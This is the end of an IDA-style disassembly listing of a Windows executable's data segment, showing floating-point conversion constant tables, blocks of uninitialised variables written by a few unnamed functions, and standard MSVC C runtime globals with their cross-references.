		dd 0FFFFFFFFh, 2 dup(0)
dword_430E60	dd 2 dup(0)		; DATA XREF: ___strgtold12_l+365o
					; _$I10_OUTPUT+196o
		dd 4002A000h, 2	dup(0)
		dd 4005C800h, 2	dup(0)
		dd 4008FA00h, 2	dup(0)
		dd 400C9C40h, 2	dup(0)
		dd 400FC350h, 2	dup(0)
		dd 4012F424h, 0
		dd 80000000h, 40169896h, 0
		dd 20000000h, 4019BEBCh, 0
		dd 0C9BF0400h, 40348E1Bh, 0A1000000h, 1BCECCEDh, 404ED3C2h
		dd 0B59EF020h, 0ADA82B70h, 40699DC5h, 25FD5DD0h, 4F8E1AE5h
		dd 4083EB19h, 95D79671h, 8D050E43h, 409EAF29h, 44A0BFF9h
		dd 8F1281EDh, 40B98281h, 0A6D53CBFh, 1F49FFCFh,	40D3C278h
		dd 8CE0C66Fh, 47C980E9h, 41A893BAh, 556B85BCh, 0F78D3927h
		dd 427CE070h, 0DE8EDDBCh, 0EBFB9DF9h, 4351AA7Eh, 0E376E6A1h
		dd 2F29F2CCh, 44268184h, 0AA171028h, 0E310AEF8h, 44FAC4C5h
		dd 0F3D4A7EBh, 4AE1EBF7h, 45CF957Ah, 91C7CC65h,	0A0AEA60Eh
		dd 46A3E319h, 0C17650Dh, 75868175h, 4D48C976h, 0A7E44258h
		dd 353B3993h, 53EDB2B8h, 5DE5A74Dh, 3B5DC53Dh, 5A929E8Bh
		dd 0F0A65DFFh, 54C020A1h, 61378CA5h, 5A8BFDD1h,	5D25D88Bh
		dd 67DBF989h, 0F3F895AAh, 0C8A2BF27h, 6E80DD5Dh, 979BC94Ch
		dd 52028A20h, 7525C460h, 0
dword_430FC0	dd 0CCCDCCCDh, 0CCCCCCCCh, 3FFBCCCCh, 0D70A3D71h, 0A3D70A3h
					; DATA XREF: ___strgtold12_l+37Co
					; _$I10_OUTPUT+1BAo
		dd 3FF8A3D7h, 0DF3B645Ah, 6E978D4Fh, 3FF58312h,	652CD3C3h
		dd 1758E219h, 3FF1D1B7h, 84230FD0h, 0AC471B47h,	3FEEA7C5h
		dd 69B6A640h, 0BD05AF6Ch, 3FEB8637h, 42BC3D33h,	94D5E57Ah
		dd 3FE7D6BFh, 0CEFDFDC2h, 77118461h, 3FE4ABCCh,	0E15B4C2Fh
		dd 94BEC44Dh, 3FC9E695h, 3B53C492h, 14CD4475h, 3FAF9ABEh
		dd 94BA67DEh, 1EAD4539h, 3F94CFB1h, 0E2C62324h,	313BBABCh
		dd 3F7A8B61h, 0C1595561h, 7C53B17Eh, 3F5FBB12h,	8D2FEED7h
		dd 8592BE06h, 3F44FB15h, 0E9A53F24h, 0EA27A539h, 3F2AA87Fh
		dd 0E4A1AC7Dh, 467C64BCh, 3E55DDD0h, 0CC067B63h, 83775423h
		dd 3D8191FFh, 193AFA91h, 4325637Ah, 3CACC031h, 38D18921h
		dd 0B8974782h, 3BD7FD00h, 85888DCh, 0E3E8B11Bh,	3B03A686h
		dd 424584C6h, 7599B607h, 3A2EDB37h, 0D21C7133h,	0EE32DB23h
		dd 395A9049h, 0C0BE87A6h, 82A5DA57h, 32B5A2A6h,	11B268E2h
		dd 449F52A7h, 2C10B759h, 2DE44925h, 534F3436h, 256BCEAEh
		dd 0A404598Fh, 7DC2DEC0h, 1EC6E8FBh, 5A88E79Eh,	0BF3C9157h
		dd 18228350h, 62654B4Eh, 0AF8F83FDh, 117D9406h,	9FDE2DE4h
		dd 4C8D2CEh, 0AD8A6DDh,	0FFFFFFFFh, 1Eh, 3Bh, 5Ah, 78h
		dd 97h,	0B5h, 0D4h, 0F3h, 111h,	130h, 14Eh, 16Dh, 0FFFFFFFFh
		dd 1Eh,	3Ah, 59h, 77h, 96h, 0B4h, 0D3h,	0F2h, 110h, 12Fh
		dd 14Dh, 16Ch, 7 dup(0)
; void *dword_4311A0
dword_4311A0	dd 0			; DATA XREF: sub_402C40+4054r
					; sub_409DF0+46A0r ...
		dd 17h dup(0)
		dd 73FAh dup(?)
dword_44E1E8	dd ?			; DATA XREF: sub_422EE0+8w
dword_44E1EC	dd ?			; DATA XREF: sub_422EE0+13w
dword_44E1F0	dd ?			; DATA XREF: sub_422EE0+1Fw
dword_44E1F4	dd ?			; DATA XREF: sub_422EE0+2Aw
dword_44E1F8	dd ?			; DATA XREF: sub_422EE0+35w
dword_44E1FC	dd ?			; DATA XREF: sub_422EE0+41w
dword_44E200	dd ?			; DATA XREF: sub_422EE0+4Cw
dword_44E204	dd ?			; DATA XREF: sub_422EE0+57w
dword_44E208	dd ?			; DATA XREF: sub_422EE0+63w
dword_44E20C	dd ?			; DATA XREF: sub_422EE0+6Ew
dword_44E210	dd ?			; DATA XREF: sub_422EE0+79w
dword_44E214	dd ?			; DATA XREF: sub_422EE0+85w
dword_44E218	dd ?			; DATA XREF: sub_422EE0+90w
dword_44E21C	dd ?			; DATA XREF: sub_422EE0+9Bw
dword_44E220	dd ?			; DATA XREF: sub_422EE0+A7w
dword_44E224	dd ?			; DATA XREF: sub_422EE0+B2w
dword_44E228	dd ?			; DATA XREF: sub_422EE0+BDw
dword_44E22C	dd ?			; DATA XREF: sub_422EE0+C9w
dword_44E230	dd ?			; DATA XREF: sub_422EE0+D4w
dword_44E234	dd ?			; DATA XREF: sub_422EE0+DFw
dword_44E238	dd ?			; DATA XREF: sub_422EE0+EBw
dword_44E23C	dd ?			; DATA XREF: sub_422EE0+F6w
dword_44E240	dd ?			; DATA XREF: sub_422EE0+101w
dword_44E244	dd ?			; DATA XREF: sub_422EE0+10Dw
dword_44E248	dd ?			; DATA XREF: sub_422EE0+118w
dword_44E24C	dd ?			; DATA XREF: sub_422EE0+123w
dword_44E250	dd ?			; DATA XREF: sub_422EE0+12Fw
dword_44E254	dd ?			; DATA XREF: sub_422EE0+13Aw
dword_44E258	dd ?			; DATA XREF: sub_422EE0+145w
dword_44E25C	dd ?			; DATA XREF: sub_422EE0+151w
dword_44E260	dd ?			; DATA XREF: sub_422EE0+15Cw
dword_44E264	dd ?			; DATA XREF: sub_422EE0+167w
dword_44E268	dd ?			; DATA XREF: sub_422EE0+173w
dword_44E26C	dd ?			; DATA XREF: sub_422EE0+17Ew
dword_44E270	dd ?			; DATA XREF: sub_422EE0+189w
dword_44E274	dd ?			; DATA XREF: sub_422EE0+195w
dword_44E278	dd ?			; DATA XREF: sub_422EE0+1A0w
		align 10h
dword_44E280	dd ?			; DATA XREF: sub_423090+8w
dword_44E284	dd ?			; DATA XREF: sub_423090+13w
dword_44E288	dd ?			; DATA XREF: sub_423090+1Fw
dword_44E28C	dd ?			; DATA XREF: sub_423090+2Aw
dword_44E290	dd ?			; DATA XREF: sub_423090+35w
dword_44E294	dd ?			; DATA XREF: sub_423090+41w
dword_44E298	dd ?			; DATA XREF: sub_423090+4Cw
dword_44E29C	dd ?			; DATA XREF: sub_423090+57w
dword_44E2A0	dd ?			; DATA XREF: sub_423090+63w
dword_44E2A4	dd ?			; DATA XREF: sub_423090+6Ew
dword_44E2A8	dd ?			; DATA XREF: sub_423090+79w
dword_44E2AC	dd ?			; DATA XREF: sub_423090+85w
dword_44E2B0	dd ?			; DATA XREF: sub_423090+90w
dword_44E2B4	dd ?			; DATA XREF: sub_423090+9Bw
dword_44E2B8	dd ?			; DATA XREF: sub_423090+A7w
dword_44E2BC	dd ?			; DATA XREF: sub_423090+B2w
dword_44E2C0	dd ?			; DATA XREF: sub_423090+BDw
dword_44E2C4	dd ?			; DATA XREF: sub_423090+C9w
dword_44E2C8	dd ?			; DATA XREF: sub_423090+D4w
dword_44E2CC	dd ?			; DATA XREF: sub_423090+DFw
dword_44E2D0	dd ?			; DATA XREF: sub_423090+EBw
dword_44E2D4	dd ?			; DATA XREF: sub_423090+F6w
dword_44E2D8	dd ?			; DATA XREF: sub_423090+101w
dword_44E2DC	dd ?			; DATA XREF: sub_423090+10Dw
dword_44E2E0	dd ?			; DATA XREF: sub_423090+118w
dword_44E2E4	dd ?			; DATA XREF: sub_423090+123w
dword_44E2E8	dd ?			; DATA XREF: sub_423090+12Fw
dword_44E2EC	dd ?			; DATA XREF: sub_423090+13Aw
dword_44E2F0	dd ?			; DATA XREF: sub_423090+145w
dword_44E2F4	dd ?			; DATA XREF: sub_423090+151w
dword_44E2F8	dd ?			; DATA XREF: sub_423090+15Cw
dword_44E2FC	dd ?			; DATA XREF: sub_423090+167w
dword_44E300	dd ?			; DATA XREF: sub_423090+173w
dword_44E304	dd ?			; DATA XREF: sub_423090+17Ew
dword_44E308	dd ?			; DATA XREF: sub_423090+189w
dword_44E30C	dd ?			; DATA XREF: sub_423090+195w
dword_44E310	dd ?			; DATA XREF: sub_423090+1A0w
dword_44E314	dd ?			; DATA XREF: sub_423090+1ABw
dword_44E318	dd ?			; DATA XREF: sub_423090+1B7w
dword_44E31C	dd ?			; DATA XREF: sub_423090+1C2w
dword_44E320	dd ?			; DATA XREF: sub_423090+1CDw
dword_44E324	dd ?			; DATA XREF: sub_423090+1D9w
dword_44E328	dd ?			; DATA XREF: sub_423090+1E4w
dword_44E32C	dd ?			; DATA XREF: sub_423090+1EFw
dword_44E330	dd ?			; DATA XREF: sub_423090+1FBw
dword_44E334	dd ?			; DATA XREF: sub_423090+206w
dword_44E338	dd ?			; DATA XREF: sub_423090+211w
dword_44E33C	dd ?			; DATA XREF: sub_423090+21Dw
dword_44E340	dd ?			; DATA XREF: sub_423090+228w
dword_44E344	dd ?			; DATA XREF: sub_423090+233w
dword_44E348	dd ?			; DATA XREF: sub_423090+23Fw
dword_44E34C	dd ?			; DATA XREF: sub_423090+24Aw
dword_44E350	dd ?			; DATA XREF: sub_423090+255w
dword_44E354	dd ?			; DATA XREF: sub_423090+261w
dword_44E358	dd ?			; DATA XREF: sub_423090+26Cw
dword_44E35C	dd ?			; DATA XREF: sub_423090+277w
dword_44E360	dd ?			; DATA XREF: sub_423090+283w
dword_44E364	dd ?			; DATA XREF: sub_423090+28Ew
dword_44E368	dd ?			; DATA XREF: sub_423090+299w
dword_44E36C	dd ?			; DATA XREF: sub_423090+2A5w
dword_44E370	dd ?			; DATA XREF: sub_423090+2B0w
dword_44E374	dd ?			; DATA XREF: sub_423090+2BBw
dword_44E378	dd ?			; DATA XREF: sub_423090+2C7w
dword_44E37C	dd ?			; DATA XREF: sub_423090+2D2w
dword_44E380	dd ?			; DATA XREF: sub_423090+2DDw
dword_44E384	dd ?			; DATA XREF: sub_423090+2E9w
dword_44E388	dd ?			; DATA XREF: sub_423090+2F4w
dword_44E38C	dd ?			; DATA XREF: sub_423090+2FFw
dword_44E390	dd ?			; DATA XREF: sub_423090+30Bw
dword_44E394	dd ?			; DATA XREF: sub_423090+316w
dword_44E398	dd ?			; DATA XREF: sub_423090+321w
dword_44E39C	dd ?			; DATA XREF: sub_423090+32Dw
dword_44E3A0	dd ?			; DATA XREF: sub_423090+338w
dword_44E3A4	dd ?			; DATA XREF: sub_423090+343w
dword_44E3A8	dd ?			; DATA XREF: sub_423090+34Fw
dword_44E3AC	dd ?			; DATA XREF: sub_423090+35Aw
dword_44E3B0	dd ?			; DATA XREF: sub_423090+365w
dword_44E3B4	dd ?			; DATA XREF: sub_423090+371w
dword_44E3B8	dd ?			; DATA XREF: sub_423090+37Cw
dword_44E3BC	dd ?			; DATA XREF: sub_423090+387w
dword_44E3C0	dd ?			; DATA XREF: sub_423090+393w
dword_44E3C4	dd ?			; DATA XREF: sub_423090+39Ew
dword_44E3C8	dd ?			; DATA XREF: sub_423090+3A9w
dword_44E3CC	dd ?			; DATA XREF: sub_423090+3B5w
dword_44E3D0	dd ?			; DATA XREF: sub_423090+3C0w
dword_44E3D4	dd ?			; DATA XREF: sub_423090+3CBw
dword_44E3D8	dd ?			; DATA XREF: sub_423090+3D7w
dword_44E3DC	dd ?			; DATA XREF: sub_423090+3E2w
dword_44E3E0	dd ?			; DATA XREF: sub_423090+3EDw
dword_44E3E4	dd ?			; DATA XREF: sub_423090+3F9w
dword_44E3E8	dd ?			; DATA XREF: sub_423090+404w
dword_44E3EC	dd ?			; DATA XREF: sub_423090+40Fw
dword_44E3F0	dd ?			; DATA XREF: sub_423090+41Bw
dword_44E3F4	dd ?			; DATA XREF: sub_423090+426w
dword_44E3F8	dd ?			; DATA XREF: sub_423090+431w
dword_44E3FC	dd ?			; DATA XREF: sub_423090+43Dw
dword_44E400	dd ?			; DATA XREF: sub_423090+448w
dword_44E404	dd ?			; DATA XREF: sub_423090+453w
dword_44E408	dd ?			; DATA XREF: sub_423090+45Fw
dword_44E40C	dd ?			; DATA XREF: sub_423090+46Aw
dword_44E410	dd ?			; DATA XREF: sub_423090+475w
dword_44E414	dd ?			; DATA XREF: sub_423090+481w
dword_44E418	dd ?			; DATA XREF: sub_423090+48Cw
dword_44E41C	dd ?			; DATA XREF: sub_423090+497w
dword_44E420	dd ?			; DATA XREF: sub_423090+4A3w
dword_44E424	dd ?			; DATA XREF: sub_423090+4AEw
dword_44E428	dd ?			; DATA XREF: sub_423090+4B9w
dword_44E42C	dd ?			; DATA XREF: sub_423090+4C5w
dword_44E430	dd ?			; DATA XREF: sub_423090+4D0w
dword_44E434	dd ?			; DATA XREF: sub_423090+4DBw
dword_44E438	dd ?			; DATA XREF: sub_423090+4E7w
dword_44E43C	dd ?			; DATA XREF: sub_423090+4F2w
dword_44E440	dd ?			; DATA XREF: sub_423090+4FDw
dword_44E444	dd ?			; DATA XREF: sub_423090+509w
dword_44E448	dd ?			; DATA XREF: sub_423090+514w
dword_44E44C	dd ?			; DATA XREF: sub_423090+51Fw
dword_44E450	dd ?			; DATA XREF: sub_423090+52Bw
dword_44E454	dd ?			; DATA XREF: sub_423090+536w
dword_44E458	dd ?			; DATA XREF: sub_422C60+8w
dword_44E45C	dd ?			; DATA XREF: sub_422C60+13w
dword_44E460	dd ?			; DATA XREF: sub_422C60+1Fw
dword_44E464	dd ?			; DATA XREF: sub_422C60+2Aw
dword_44E468	dd ?			; DATA XREF: sub_422C60+35w
dword_44E46C	dd ?			; DATA XREF: sub_422C60+41w
dword_44E470	dd ?			; DATA XREF: sub_422C60+4Cw
dword_44E474	dd ?			; DATA XREF: sub_422C60+57w
dword_44E478	dd ?			; DATA XREF: sub_422C60+63w
dword_44E47C	dd ?			; DATA XREF: sub_422C60+6Ew
dword_44E480	dd ?			; DATA XREF: sub_422C60+79w
dword_44E484	dd ?			; DATA XREF: sub_422C60+85w
dword_44E488	dd ?			; DATA XREF: sub_422C60+90w
dword_44E48C	dd ?			; DATA XREF: sub_422C60+9Bw
dword_44E490	dd ?			; DATA XREF: sub_422C60+A7w
dword_44E494	dd ?			; DATA XREF: sub_422C60+B2w
dword_44E498	dd ?			; DATA XREF: sub_422C60+BDw
dword_44E49C	dd ?			; DATA XREF: sub_422C60+C9w
dword_44E4A0	dd ?			; DATA XREF: sub_422C60+D4w
dword_44E4A4	dd ?			; DATA XREF: sub_422C60+DFw
dword_44E4A8	dd ?			; DATA XREF: sub_422C60+EBw
dword_44E4AC	dd ?			; DATA XREF: sub_422C60+F6w
dword_44E4B0	dd ?			; DATA XREF: sub_422C60+101w
dword_44E4B4	dd ?			; DATA XREF: sub_422C60+10Dw
dword_44E4B8	dd ?			; DATA XREF: sub_422C60+118w
dword_44E4BC	dd ?			; DATA XREF: sub_422C60+123w
dword_44E4C0	dd ?			; DATA XREF: sub_422C60+12Fw
dword_44E4C4	dd ?			; DATA XREF: sub_422C60+13Aw
dword_44E4C8	dd ?			; DATA XREF: sub_422C60+145w
dword_44E4CC	dd ?			; DATA XREF: sub_422C60+151w
dword_44E4D0	dd ?			; DATA XREF: sub_422C60+15Cw
dword_44E4D4	dd ?			; DATA XREF: sub_422C60+167w
dword_44E4D8	dd ?			; DATA XREF: sub_422C60+173w
dword_44E4DC	dd ?			; DATA XREF: sub_422C60+17Ew
dword_44E4E0	dd ?			; DATA XREF: sub_422C60+189w
dword_44E4E4	dd ?			; DATA XREF: sub_422C60+195w
dword_44E4E8	dd ?			; DATA XREF: sub_422C60+1A0w
dword_44E4EC	dd ?			; DATA XREF: sub_422C60+1ABw
dword_44E4F0	dd ?			; DATA XREF: sub_422C60+1B7w
dword_44E4F4	dd ?			; DATA XREF: sub_422C60+1C2w
dword_44E4F8	dd ?			; DATA XREF: sub_422C60+1CDw
dword_44E4FC	dd ?			; DATA XREF: sub_422C60+1D9w
dword_44E500	dd ?			; DATA XREF: sub_422C60+1E4w
dword_44E504	dd ?			; DATA XREF: sub_422C60+1EFw
dword_44E508	dd ?			; DATA XREF: sub_422C60+1FBw
dword_44E50C	dd ?			; DATA XREF: sub_422C60+206w
dword_44E510	dd ?			; DATA XREF: sub_422C60+211w
dword_44E514	dd ?			; DATA XREF: sub_422C60+21Dw
dword_44E518	dd ?			; DATA XREF: sub_422C60+228w
dword_44E51C	dd ?			; DATA XREF: sub_422C60+233w
dword_44E520	dd ?			; DATA XREF: sub_422C60+23Fw
dword_44E524	dd ?			; DATA XREF: sub_422C60+24Aw
dword_44E528	dd ?			; DATA XREF: sub_422C60+255w
dword_44E52C	dd ?			; DATA XREF: sub_422C60+261w
dword_44E530	dd ?			; DATA XREF: sub_422C60+26Cw
dword_44E534	dd ?			; DATA XREF: _log:exitr
					; _log:_ErrorHandlingr	...
dword_44E538	dd ?			; DATA XREF: __fpmath+13w
					; .text:00418A82r
; char *dword_44E53C
dword_44E53C	dd ?			; DATA XREF: ___tmainCRTStartup+BAw
					; __setenvp+Fr	...
		dd ?
dword_44E544	dd ?			; DATA XREF: _fast_error_exit+5r
					; __set_error_mode+19r	...
dword_44E548	dd ?			; DATA XREF: sub_4173A6+8w
					; __callnewh+5r
dword_44E54C	dd ?			; DATA XREF: _realloc+158r
					; _realloc+1C1r ...
dword_44E550	dd 54h dup(?)		; DATA XREF: __mtinitlocks+6o
; HANDLE hHeap
hHeap		dd ?			; DATA XREF: _realloc+D7r
					; _realloc+12Er ...
; void *dword_44E6A4
dword_44E6A4	dd ?			; DATA XREF: ___sbh_free_block+21Er
					; ___sbh_free_block+251r ...
		dd ?
dword_44E6AC	dd ?			; DATA XREF: __setargv+A4w
dword_44E6B0	dd ?			; DATA XREF: __setargv+A9w
		align 8
; void *dword_44E6B8
dword_44E6B8	dd ?			; DATA XREF: __setenvp+47w
					; __setenvp:loc_41AA08r ...
		dd 3 dup(?)
dword_44E6C8	dd ?			; DATA XREF: __setargv+37w
		align 10h
byte_44E6D0	db ?			; DATA XREF: _doexit+30w
		align 4
dword_44E6D4	dd ?			; DATA XREF: _doexit+27w
dword_44E6D8	dd ?			; DATA XREF: _doexit+1Br _doexit+FEw
		align 10h
; char Dst[25]
Dst		db 19h dup(?)		; DATA XREF: __NMSG_WRITE+70o
; CHAR Filename[260]
Filename	db 104h	dup(?)		; DATA XREF: __NMSG_WRITE+94o
byte_44E7FD	db ?			; DATA XREF: __NMSG_WRITE+9Cw
		align 10h
		dd 7Dh dup(?)
dword_44E9F4	dd ?			; DATA XREF: __NMSG_WRITE+EDo
; CHAR byte_44E9F8[260]
byte_44E9F8	db 104h	dup(?)		; DATA XREF: __setargv+1Fo
byte_44EAFC	db ?			; DATA XREF: __setargv+26w
		align 10h
dword_44EB00	dd ?			; DATA XREF: ___crtGetEnvironmentStringsA+5r
					; ___crtGetEnvironmentStringsA+26w ...
dword_44EB04	dd ?			; DATA XREF: __mtinit+39w __mtinit+5Ar ...
; LPVOID lpTlsValue
lpTlsValue	dd ?			; DATA XREF: ___set_flsgetvalue+15r
					; __mtinit+46w	...
dword_44EB0C	dd ?			; DATA XREF: __getptd_noexit+3Ar
					; __mtinit+53w	...
dword_44EB10	dd ?			; DATA XREF: __mtterm+Br __mtinit+67w	...
dword_44EB14	dd ?			; DATA XREF: getSystemCP(int)+14w
					; getSystemCP(int)+1Fw	...
word_44EB18	dw ?			; DATA XREF: __setmbcp+E7w
		align 4
		dd 2 dup(?)
dword_44EB24	dd ?			; DATA XREF: __setmbcp+C3w
dword_44EB28	dd ?			; DATA XREF: __setmbcp+CBw
dword_44EB2C	dd ?			; DATA XREF: __setmbcp+D3w
dword_44EB30	dd ?			; DATA XREF: _isdigit+5r _tolower+5r ...
		dd 8 dup(?)
dword_44EB54	dd ?			; DATA XREF: sub_41C0B5+8w
					; __invalid_parameter+5r
byte_44EB58	db ?			; DATA XREF: __cftoe2_l:loc_416AB3r
		align 4
dword_44EB5C	dd ?			; DATA XREF: sub_41CDA4+8w
dword_44EB60	dd ?			; DATA XREF: __malloc_crt+18r
					; __malloc_crt+2Dr ...
dword_44EB64	dd ?			; DATA XREF: ___libm_error_support+2Er
dword_44EB68	dd ?			; DATA XREF: __initp_eh_hooks+Bw
dword_44EB6C	dd ?			; DATA XREF: __initp_misc_winsig+8w
					; _raise:loc_41E95Ao ...
dword_44EB70	dd ?			; DATA XREF: __initp_misc_winsig+Dw
					; _raise:loc_41E9B0o ...
dword_44EB74	dd ?			; DATA XREF: __initp_misc_winsig+12w
					; sub_41E904r ...
dword_44EB78	dd ?			; DATA XREF: __initp_misc_winsig+17w
					; _raise:loc_41E9BCo ...
		align 10h
dword_44EB80	dd ?			; DATA XREF: sub_41EAC1+8w
		dd 2 dup(?)
dword_44EB8C	dd ?			; DATA XREF: sub_41EAD0+8w
dword_44EB90	dd ?			; DATA XREF: sub_41EADF+14r
					; sub_41EADF+5Cw ...
dword_44EB94	dd ?			; DATA XREF: sub_41EADF+71w
					; sub_41EADF:loc_41EBE8r
dword_44EB98	dd ?			; DATA XREF: sub_41EADF+86w
					; sub_41EADF+126r
dword_44EB9C	dd ?			; DATA XREF: sub_41EADF+ACw
					; sub_41EADF:loc_41EB90r
dword_44EBA0	dd ?			; DATA XREF: sub_41EADF+94w
					; sub_41EADF+BAr ...
dword_44EBA4	dd ?			; DATA XREF: __crtLCMapStringA_stat(localeinfo_struct *,ulong,ulong,char const *,int,char *,int,int,int)+19r
					; __crtLCMapStringA_stat(localeinfo_struct *,ulong,ulong,char const *,int,char *,int,int,int)+3Cw ...
dword_44EBA8	dd ?			; DATA XREF: __crtGetStringTypeA_stat(localeinfo_struct	*,ulong,char const *,int,ushort	*,int,int,int)+11r
					; __crtGetStringTypeA_stat(localeinfo_struct *,ulong,char const	*,int,ushort *,int,int,int)+39w ...
dword_44EBAC	dd ?			; DATA XREF: .data:off_430C24o
					; .data:off_430C28o ...
dword_44EBB0	dd ?			; DATA XREF: ___report_gsfailure+91w
					; .rdata:ExceptionInfoo
dword_44EBB4	dd ?			; DATA XREF: ___report_gsfailure+9Bw
		dd ?
dword_44EBBC	dd ?			; DATA XREF: ___report_gsfailure+8Cw
		align 80h
dword_44EC00	dd ?			; DATA XREF: ___report_gsfailure+C1w
					; ___report_gsfailure+E1r
		align 8
dword_44EC08	dd ?			; DATA XREF: ___report_gsfailure+7Dw
					; .rdata:ExceptionInfoo
		dd 22h dup(?)
word_44EC94	dw ?			; DATA XREF: ___report_gsfailure+51w
		align 4
word_44EC98	dw ?			; DATA XREF: ___report_gsfailure+4Aw
		align 4
word_44EC9C	dw ?			; DATA XREF: ___report_gsfailure+43w
		align 10h
word_44ECA0	dw ?			; DATA XREF: ___report_gsfailure+3Cw
		align 4
dword_44ECA4	dd ?			; DATA XREF: ___report_gsfailure+28w
dword_44ECA8	dd ?			; DATA XREF: ___report_gsfailure+22w
dword_44ECAC	dd ?			; DATA XREF: ___report_gsfailure+1Cw
dword_44ECB0	dd ?			; DATA XREF: ___report_gsfailure+16w
dword_44ECB4	dd ?			; DATA XREF: ___report_gsfailure+10w
dword_44ECB8	dd ?			; DATA XREF: ___report_gsfailure+Bw
dword_44ECBC	dd ?			; DATA XREF: ___report_gsfailure+62w
dword_44ECC0	dd ?			; DATA XREF: ___report_gsfailure+6Aw
					; ___report_gsfailure+87r
word_44ECC4	dw ?			; DATA XREF: ___report_gsfailure+35w
		align 4
dword_44ECC8	dd ?			; DATA XREF: ___report_gsfailure+59w
dword_44ECCC	dd ?			; DATA XREF: ___report_gsfailure+72w
word_44ECD0	dw ?			; DATA XREF: ___report_gsfailure+2Ew
		align 4
		dd 0AFh	dup(?)
dword_44EF90	dd ?			; DATA XREF: sub_41F7C0w
dword_44EF94	dd ?			; DATA XREF: ___libm_error_support+36r
; UINT uNumber
uNumber		dd ?			; DATA XREF: __ioinit+3Cw __ioinit+CDw ...
		align 10h
dword_44EFA0	dd ?			; DATA XREF: __ioinit+37w __ioinit+6Er ...
		dd 3Fh dup(?)
dword_44F0A0	dd ?			; DATA XREF: __setenvp+B6w
dword_44F0A4	dd ?			; DATA XREF: _doexit+54r _doexit+A1r ...
dword_44F0A8	dd ?			; DATA XREF: _doexit+3Fr _doexit+94r ...
dword_44F0AC	dd ?			; DATA XREF: __wincmdln+6r __setenvpr	...
dword_44F0B0	dd ?			; DATA XREF: __cinit+5Cr __cinit+66o ...
dword_44F0B4	dd ?			; DATA XREF: _expr _exp:__CIexpr ...
dword_44F0B8	dd ?			; DATA XREF: __ftol2_sser
					; __ftol2_sse:__ftol2_sse_excptr ...
dword_44F0BC	dd ?			; DATA XREF: __except_handler4+EAr
					; __except_handler4+F3o ...
dword_44F0C0	dd ?			; DATA XREF: ___sbh_find_block+5r
					; ___sbh_free_block+2BCr ...
; LPVOID lpMem
lpMem		dd ?			; DATA XREF: ___sbh_find_block+Br
					; ___sbh_free_block+2CAr ...
dword_44F0C8	dd ?			; DATA XREF: _realloc+6Cr
					; _V6_HeapAlloc+13r ...
dword_44F0CC	dd ?			; DATA XREF: ___sbh_free_block+2FEw
					; ___sbh_alloc_block:loc_417DE1r ...
dword_44F0D0	dd ?			; DATA XREF: ___sbh_alloc_new_regionr
					; ___sbh_alloc_new_region:loc_417937w
dword_44F0D4	dd ?			; DATA XREF: ___sbh_free_block+22Br
					; ___sbh_free_block+24Br ...
dword_44F0D8	dd ?			; DATA XREF: _realloc:loc_415E7Fr
					; __heap_init+29w ...
dword_44F0DC	dd ?			; DATA XREF: ___tmainCRTStartup+B0w
					; __wincmdln:loc_41A8F5r ...
		align 1000h
_data		ends


		end $LN33
